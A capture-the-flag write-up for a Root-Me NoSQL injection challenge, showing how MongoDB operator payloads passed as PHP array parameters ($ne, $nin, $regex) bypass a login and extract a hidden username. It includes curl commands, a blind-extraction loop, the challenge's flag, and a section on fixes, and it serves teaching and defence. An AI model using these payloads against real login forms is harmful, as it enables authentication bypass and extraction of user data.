# Root-Me — Web-Server / NoSQL injection - Authentication (ch38)

- **Target:** http://challenge01.root-me.org/web-serveur/ch38/
- **Class:** NoSQL injection (MongoDB operator injection via PHP array parameters)
- **Author / date:** mastho, 31 May 2015
- **Goal:** find the username of the hidden user

## Flag

```
flag{nosqli_no_secret_4_you}
```

That string *is* the hidden user's username — the challenge hides the answer in the
`username` field of the third account.

Verified byte-exact and length-confirmed by anchored regex (see controls below):

```
login[$regex]=^flag\{nosqli_no_secret_4_you\}$   ->  You are connected as : flag{nosqli_no_secret_4_you}
```

## Recovered user list

Full enumeration of the collection (first-character sweep over `a-z`, `A-Z`, `0-9`):

| # | Username | Notes |
|---|---|---|
| 1 | `admin` | returned first by any match-all query |
| 2 | `test` | |
| 3 | **`flag{nosqli_no_secret_4_you}`** | the hidden user |

No usernames begin with an uppercase letter or a digit.

## The vulnerable code

The form is a **GET** form with `login` and `pass`:

```html
<form action="">
  Nickname : <input type="text" name="login">
  Password : <input type="password" name="pass">
</form>
```

The backend is MongoDB, and the parameters are passed to `find()` **without
type-checking**. In PHP, `?login[$ne]=x` makes `$_GET['login']` an **array** rather
than a string, and the MongoDB driver serialises that array into a query *operator*.
Reconstructed:

```php
$user = $db->users->findOne([
    'username' => $_GET['login'],   // if this is an array -> becomes a query operator
    'password' => $_GET['pass'],
]);
if ($user) echo "You are connected as : " . $user['username'];
else       echo "Bad username or bad password !";
```

The page echoes the matched **username**, which turns a plain auth bypass into a
full extraction oracle — the same pattern as the SQLi challenges, just with a
different query language.

## Step 1 — Confirm the injection

| Payload | Response | Reading |
|---|---|---|
| `login=admin&pass=admin` | `Bad username or bad password !` | baseline (control) |
| `login[$ne]=x&pass[$ne]=x` | `You are connected as : admin` | **bypassed** — `$ne` matches every doc |
| `login[$regex]=^a&pass[$ne]=x` | `You are connected as : admin` | regex operator accepted |
| `login[$ne]=x&pass=whatever` | `Bad username` | the `pass` field is a *separate* condition, not ignored |

`$ne` (`not equal`) against a non-existent value is true for every document, so the
query degenerates to "match any user". Because `findOne()` returns the first document,
you land on `admin` — but `admin` is not the hidden user.

## Step 2 — Extract the hidden user

Two independent methods, both one-request:

**A. `$nin` — exclude the known users.** Cleanest option; the collection only has three
documents, so excluding the two visible ones leaves exactly the hidden one:

```bash
curl -s -G "http://challenge01.root-me.org/web-serveur/ch38/" \
  --data-urlencode 'login[$nin][]=admin' \
  --data-urlencode 'login[$nin][]=test' \
  --data-urlencode 'pass[$ne]=x'
# -> You are connected as : flag{nosqli_no_secret_4_you}
```

**B. `$regex` — blind character-by-character.** Standard fallback when you don't know the
other usernames. `^` anchors the pattern, and the echoed username is the oracle:

```bash
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  echo -n "$c -> "
  curl -s -G "http://challenge01.root-me.org/web-serveur/ch38/" \
    --data-urlencode "login[\$regex]=^$c" --data-urlencode 'pass[$ne]=x' \
    | grep -o 'You are connected as : .*'
done
```

```
a -> You are connected as : admin
f -> You are connected as : flag{nosqli_no_secret_4_you}
t -> You are connected as : test
```

Only `a`, `f`, `t` hit. Anchoring the full string confirms the exact value and length in
one shot:

```
login[$regex]=^flag\{nosqli_no_secret_4_you\}$   -> match
```

## Negative controls

| # | Probe | Expected | Observed |
|---|---|---|---|
| 1 | `login=admin&pass=admin` (string) | rejected | `Bad username or bad password !` |
| 2 | `login[$ne]=x&pass[$ne]=x` | bypass | `You are connected as : admin` |
| 3 | `^flag\{nosqli_no_secret_4_yoX$` (last char wrong) | no match | `Bad username or bad password !` |
| 4 | `^flag\{nosqli_no_secret_4_you\}.$` (requires a trailing char) | no match | `Bad username or bad password !` |
| 5 | `^flag\{nosqli_no_secret_4_yo$` (truncated prefix, `$`-anchored) | no match | `Bad username or bad password !` |
| 6 | `^flag\{nosqli_no_secret_4_you\}$` repeated | stable | same username both times |
| 7 | `login[$regex]=^.` | no 1-char username exists | `Bad username or bad password !` |

Controls 3–5 are the important ones: they prove the recovered string is the *complete,
exact* username. A wrong final character, a missing character, and an extra required
character all fail — so the value is not a prefix artefact of the regex oracle.

## Root cause

1. **No type validation on user input.** `$_GET['login']` is passed straight into the
   Mongo query. PHP's `param[key]=value` syntax silently converts a scalar parameter
   into an array, and the MongoDB driver interprets an array as a **query operator**.
   A username field that should be a string becomes `{"$ne": "x"}`.
2. **Query operators reachable from user input.** `$ne`, `$regex`, `$nin`, `$gt`, `$where`
   and friends are all expressible by the attacker because nothing strips or rejects
   `$`-prefixed keys.
3. **The response leaks the matched username**, converting an authentication bypass into
   a data-exfiltration primitive (the `$regex` oracle).

Note that `$where` did **not** work here (the payload returned no match rather than
executing JS) — the modern driver/`mongod` configuration rejects it, which is the one
thing this deployment got right.

## Fix

- **Cast before you query.** Force scalars, and reject arrays outright:

  ```php
  if (!is_string($_GET['login']) || !is_string($_GET['pass'])) {
      http_response_code(400);
      exit('Invalid input');
  }
  $login = (string) $_GET['login'];
  $pass  = (string) $_GET['pass'];
  ```

- **Never build the query document from raw input.** Even with a cast, prefer an explicit
  shape and, where the driver supports it, an ODM/schema layer that enforces types:

  ```php
  $user = $db->users->findOne([
      'username' => ['$eq' => $login],   // '$eq' makes an operator-keyed array a value, not a clause
      'password' => ['$eq' => $pass],
  ]);
  ```

  `$eq` is the robust idiom: an injected `['$ne' => 'x']` then becomes the *value*
  `{"$eq": {"$ne": "x"}}`, which matches nothing.

- **Hash passwords** (`password_hash()` / Argon2id) and compare with `password_verify()`.
- **Don't echo the matched identity back** on a failed/ambiguous login path, and return a
  generic error — the username echo is what made blind extraction trivial.
- Rate-limit login attempts; a `$regex` oracle is otherwise a free brute-force channel.

## Generalisation

Same bug class shows up in any stack that deserialises bracket-notation parameters into
structured query objects:

- PHP + MongoDB: `?user[$ne]=1` (this challenge)
- Node/Express + `qs`: `?user[$ne]=1` — same trick, `qs` produces the object
- Any place `$`-prefixed keys survive into the query builder

Detection heuristic: if a parameter is a *scalar* field and the app accepts
`param[anything]=x` without complaint, you are one step from operator injection.
